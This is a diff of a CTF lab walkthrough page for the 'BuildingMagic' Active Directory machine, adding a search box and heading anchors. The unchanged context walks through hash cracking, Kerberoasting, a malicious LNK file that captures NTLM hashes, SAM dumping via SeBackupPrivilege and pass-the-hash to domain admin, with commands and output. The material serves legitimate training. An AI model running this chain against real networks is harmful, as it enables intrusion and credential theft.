@@ -153,6 +153,16 @@
     <span class="cursor" id="term-cursor" aria-hidden="true"></span>
     <span class="sr-only">Zerotrace Logs</span>
   </h1>
+  <!-- Search Box -->
+  <div class="search-container">
+    <input type="search"
+           id="siteSearch"
+           class="search-input"
+           placeholder="Search walkthroughs..."
+           aria-label="Search walkthroughs"
+           autocomplete="off">
+    <div id="searchResults" class="search-results" hidden></div>
+  </div>
 </header>
 
 <!-- Side hamburger control -->
@@ -210,7 +220,7 @@
 <div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
 
 <section>
-  <h2>BuildingMagic</h2>
+  <h2 id="buildingmagic">BuildingMagic</h2>
 
   <div class="machine-info">
     <ul>
@@ -221,18 +231,18 @@
     </ul>
   </div>
 
-  <h3>Overview</h3>
+  <h3 id="overview">Overview</h3>
   <p>As a penetration tester on the Hack Smarter Pentesters team, the objective is to achieve a full compromise of the Active Directory environment.</p>
   <p><strong>Starting Point:</strong> A prior enumeration phase yielded a leaked database containing usernames and hashed passwords.</p>
   <p><strong>Goal:</strong> Leverage the compromised credentials to escalate privileges, move laterally through the Active Directory, and ultimately achieve complete domain compromise.</p>
 
-  <h3>Lab Setup</h3>
+  <h3 id="lab-setup">Lab Setup</h3>
   <p>Add the following entries to <code>/etc/hosts</code>:</p>
   <pre><code>&lt;TARGET_IP&gt;  buildingmagic.local dc01.buildingmagic.local</code></pre>
 
-  <h2>Reconnaissance</h2>
+  <h2 id="reconnaissance">Reconnaissance</h2>
 
-  <h3><span class="step">[Step 1]</span> Analyzing the Leaked Database</h3>
+  <h3 id="analyzing-the-leaked-database"><span class="step">[Step 1]</span> Analyzing the Leaked Database</h3>
   <p>The leaked database contains the following user information:</p>
   <pre><code>id  username        full_name            role            password
 1   r.widdleton     Ron Widdleton        Intern Builder  c4a21c4d438819d73d24851e7966229c
@@ -246,7 +256,7 @@
 9   t.ren           Theodore Ren         Safety Officer  bfaf794a81438488e57ee3954c27cd75
 10  e.macmillan     Ernest Macmillan     Surveyor        47d23284395f618bea1959e710bc68ef</code></pre>
 
-  <h3><span class="step">[Step 2]</span> Extracting and Cracking Password Hashes</h3>
+  <h3 id="extracting-and-cracking-password-hashes"><span class="step">[Step 2]</span> Extracting and Cracking Password Hashes</h3>
   <p>I extracted just the hashes from the leaked data to check against CrackStation:</p>
   <pre><code>$ awk '{print $NF}' leak_data</code></pre>
 
@@ -273,9 +283,9 @@
     <strong>What is hashcat -m 0?</strong> The <code>-m</code> flag in hashcat specifies the hash type. Mode <code>0</code> is for raw MD5 hashes. The <code>--show</code> flag displays already-cracked hashes from hashcat's potfile.
   </div>
 
-  <h2>Initial Access</h2>
+  <h2 id="initial-access">Initial Access</h2>
 
-  <h3><span class="step">[Step 3]</span> Credential Validation</h3>
+  <h3 id="credential-validation"><span class="step">[Step 3]</span> Credential Validation</h3>
   <p>I validated the credentials using NetExec. Only <code>r.widdleton</code> had valid access:</p>
   <pre><code>$ nxc smb 10.1.167.230 -u r.widdleton -p [REDACTED]
 SMB   10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:[REDACTED]</code></pre>
@@ -289,9 +299,9 @@ SMB   10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:[REDACTED]</c
     NetExec is the successor to CrackMapExec, a post-exploitation tool for testing credentials against various Windows services (SMB, LDAP, WinRM, etc.). The <code>[+]</code> indicates successful authentication.
   </div>
 
-  <h2>Lateral Movement</h2>
+  <h2 id="lateral-movement">Lateral Movement</h2>
 
-  <h3><span class="step">[Step 4]</span> BloodHound Enumeration</h3>
+  <h3 id="bloodhound-enumeration"><span class="step">[Step 4]</span> BloodHound Enumeration</h3>
   <p>Using BloodHound, I discovered a Kerberoastable user account: <code>r.haggard</code>.</p>
 
   <p><img src="../assets/buildingmagic/bloodhound-kerberoastable.png" alt="BloodHound query showing Kerberoastable users with r.haggard identified" loading="lazy"></p>
@@ -303,13 +313,13 @@ SMB   10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:[REDACTED]</c
     Kerberoasting is an attack that extracts service account credential hashes from Active Directory. Any authenticated domain user can request a Kerberos service ticket (TGS) for accounts with a Service Principal Name (SPN) set. The ticket is encrypted with the service account's password hash, which can then be cracked offline without generating authentication failures.
   </div>
 
-  <h3><span class="step">[Step 5]</span> Kerberoasting r.haggard</h3>
+  <h3 id="kerberoasting-r-haggard"><span class="step">[Step 5]</span> Kerberoasting r.haggard</h3>
   <p>I used NetExec to perform the Kerberoasting attack:</p>
   <pre><code>$ nxc ldap 10.1.167.230 -u r.widdleton -p [REDACTED] --kerberoast output.txt</code></pre>
 
   <p><img src="../assets/buildingmagic/nxc-kerberoasting.png" alt="NetExec Kerberoasting output capturing TGS hash for r.haggard" loading="lazy"></p>
 
-  <h3><span class="step">[Step 6]</span> Cracking the TGS Hash</h3>
+  <h3 id="cracking-the-tgs-hash"><span class="step">[Step 6]</span> Cracking the TGS Hash</h3>
   <p>I cracked the Kerberos TGS hash using hashcat:</p>
   <pre><code>$ hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
 $krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$...:[REDACTED]</code></pre>
@@ -322,7 +332,7 @@ $krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$...:[REDACTED]</code></pre>
   <pre><code>$ nxc ldap 10.1.167.230 -u r.haggard -p '[REDACTED]'
 LDAP  10.1.167.230  389  DC01  [+] BUILDINGMAGIC.LOCAL\r.haggard:[REDACTED]</code></pre>
 
-  <h3><span class="step">[Step 7]</span> ForceChangePassword Abuse</h3>
+  <h3 id="forcechangepassword-abuse"><span class="step">[Step 7]</span> ForceChangePassword Abuse</h3>
   <p>BloodHound revealed that <code>r.haggard</code> has the <code>ForceChangePassword</code> permission over <code>h.potch</code>:</p>
 
   <p><img src="../assets/buildingmagic/bloodhound-forcechangepassword.png" alt="BloodHound graph showing r.haggard has ForceChangePassword rights over h.potch" loading="lazy"></p>
@@ -341,7 +351,7 @@ LDAP  10.1.167.230  389  DC01  [+] BUILDINGMAGIC.LOCAL\r.haggard:[REDACTED]</cod
   <pre><code>$ nxc smb 10.1.167.230 -u h.potch -p '[REDACTED]'
 SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\h.potch:[REDACTED]</code></pre>
 
-  <h3><span class="step">[Step 8]</span> NTLM Hash Capture via Malicious LNK File</h3>
+  <h3 id="ntlm-hash-capture-via-malicious-lnk-file"><span class="step">[Step 8]</span> NTLM Hash Capture via Malicious LNK File</h3>
   <p>I discovered that <code>h.potch</code> has read/write access to a file share. I used this to capture NTLM hashes through a malicious LNK file.</p>
 
   <div class="question">
@@ -375,7 +385,7 @@ putting file meeting.lnk as \meeting.lnk (5.1 kB/s) (average 5.1 kB/s)</code></p
   <p>A user browsed to the share, and I captured their NTLMv2 hash:</p>
   <pre><code>H.GRANGON::BUILDINGMAGIC:a746324b2edec74a:[REDACTED]:...</code></pre>
 
-  <h3><span class="step">[Step 9]</span> Cracking the NTLMv2 Hash</h3>
+  <h3 id="cracking-the-ntlmv2-hash"><span class="step">[Step 9]</span> Cracking the NTLMv2 Hash</h3>
   <pre><code>$ hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt
 H.GRANGON::BUILDINGMAGIC:...:[REDACTED]</code></pre>
 
@@ -385,9 +395,9 @@ H.GRANGON::BUILDINGMAGIC:...:[REDACTED]</code></pre>
 
   <p><img src="../assets/buildingmagic/nxc-hgrangon-validation.png" alt="NetExec validating h.grangon credentials" loading="lazy"></p>
 
-  <h2>Initial Shell Access</h2>
+  <h2 id="initial-shell-access">Initial Shell Access</h2>
 
-  <h3><span class="step">[Step 10]</span> Remote Management Access</h3>
+  <h3 id="remote-management-access"><span class="step">[Step 10]</span> Remote Management Access</h3>
   <p>BloodHound showed that <code>h.grangon</code> is a member of the Remote Management Users group:</p>
 
   <p><img src="../assets/buildingmagic/bloodhound-remote-management.png" alt="BloodHound showing h.grangon membership in Remote Management Users" loading="lazy"></p>
@@ -405,14 +415,14 @@ H.GRANGON::BUILDINGMAGIC:...:[REDACTED]</code></pre>
 Evil-WinRM shell v3.7
 *Evil-WinRM* PS C:\Users\h.grangon\Documents></code></pre>
 
-  <h3>User Flag</h3>
+  <h3 id="user-flag">User Flag</h3>
   <pre><code>*Evil-WinRM* PS C:\Users\h.grangon\Documents> type ..\Desktop\user.txt</code></pre>
 
   <p>The user flag is located at <code>C:\Users\h.grangon\Desktop\user.txt</code>.</p>
 
-  <h2>Privilege Escalation</h2>
+  <h2 id="privilege-escalation">Privilege Escalation</h2>
 
-  <h3><span class="step">[Step 11]</span> SeBackupPrivilege Abuse</h3>
+  <h3 id="sebackupprivilege-abuse"><span class="step">[Step 11]</span> SeBackupPrivilege Abuse</h3>
   <p>Checking privileges revealed <code>SeBackupPrivilege</code>:</p>
   <pre><code>*Evil-WinRM* PS C:\Users\h.grangon> whoami /priv
 
@@ -447,7 +457,7 @@ Info: Download successful!
 *Evil-WinRM* PS C:\Users\h.grangon\Desktop> download system.save
 Info: Download successful!</code></pre>
 
-  <h3><span class="step">[Step 12]</span> Extracting Local Hashes</h3>
+  <h3 id="extracting-local-hashes"><span class="step">[Step 12]</span> Extracting Local Hashes</h3>
   <p>Using <code>secretsdump.py</code> from Impacket, I extracted the local account hashes:</p>
   <pre><code>$ secretsdump.py -system system.save -sam sam.save LOCAL
 [*] Target system bootKey: 0x[REDACTED]
@@ -460,7 +470,7 @@ DefaultAccount:503:[REDACTED]:[REDACTED]:::</code></pre>
     <strong>What is secretsdump.py?</strong> Part of the Impacket toolkit, secretsdump.py extracts password hashes from SAM/SYSTEM registry hives, NTDS.dit files, or remotely via DCSync. The <code>LOCAL</code> parameter indicates offline extraction from dumped files.
   </div>
 
-  <h3><span class="step">[Step 13]</span> Password Spraying with Hash</h3>
+  <h3 id="password-spraying-with-hash"><span class="step">[Step 13]</span> Password Spraying with Hash</h3>
   <p>I enumerated domain users:</p>
   <pre><code>$ nxc smb 10.1.167.230 -u 'h.grangon' -p '[REDACTED]' --users
 SMB  10.1.167.230  445  DC01  Administrator
@@ -487,24 +497,24 @@ SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\a.flatch:[REDACTED]</code>
 
   <p><img src="../assets/buildingmagic/nxc-pwn3d.png" alt="NetExec confirming a.flatch has Pwn3d status" loading="lazy"></p>
 
-  <h3><span class="step">[Step 14]</span> Domain Admin Access</h3>
+  <h3 id="domain-admin-access"><span class="step">[Step 14]</span> Domain Admin Access</h3>
   <p>BloodHound confirmed that <code>a.flatch</code> is a member of the Domain Admins group:</p>
 
   <p><img src="../assets/buildingmagic/bloodhound-domain-admin.png" alt="BloodHound showing a.flatch membership in Administrators group" loading="lazy"></p>
 
-  <h2>Domain Compromise</h2>
+  <h2 id="domain-compromise">Domain Compromise</h2>
 
-  <h3><span class="step">[Step 15]</span> Administrator Shell</h3>
+  <h3 id="administrator-shell"><span class="step">[Step 15]</span> Administrator Shell</h3>
   <p>I connected as <code>a.flatch</code> using Evil-WinRM with the hash:</p>
   <pre><code>$ evil-winrm -u a.flatch -H [REDACTED] -i 10.1.167.230</code></pre>
 
   <p><img src="../assets/buildingmagic/evil-winrm-root.png" alt="Evil-WinRM shell as a.flatch reading root flag" loading="lazy"></p>
 
-  <h3>Root Flag</h3>
+  <h3 id="root-flag">Root Flag</h3>
   <pre><code>*Evil-WinRM* PS C:\Users\a.flatch\Documents> type C:\Users\Administrator\Desktop\root.txt
 9557e6</code></pre>
 
-  <h2>Tools Used</h2>
+  <h2 id="tools-used">Tools Used</h2>
   <ul class="tools-list">
     <li><strong>CrackStation</strong> - Online hash lookup</li>
     <li><strong>Hashcat</strong> - Password cracking</li>
@@ -516,7 +526,7 @@ SMB  10.1.167.230  445  DC01  [+] BUILDINGMAGIC.LOCAL\a.flatch:[REDACTED]</code>
     <li><strong>Impacket</strong> - secretsdump.py</li>
   </ul>
 
-  <h2>Attack Chain Summary</h2>
+  <h2 id="attack-chain-summary">Attack Chain Summary</h2>
   <div class="attack-chain">
     <pre><code>Leaked DB -> r.widdleton (password crack)
     |
@@ -539,7 +549,7 @@ Pass-the-Hash -> a.flatch (Domain Admin)
 Domain Compromise</code></pre>
   </div>
 
-  <h2>Key Takeaways</h2>
+  <h2 id="key-takeaways">Key Takeaways</h2>
   <div class="answer lessons-learned">
     <ul>
       <li><strong>Password reuse is dangerous:</strong> The local Administrator password being reused by a domain admin (a.flatch) enabled full domain compromise.</li>
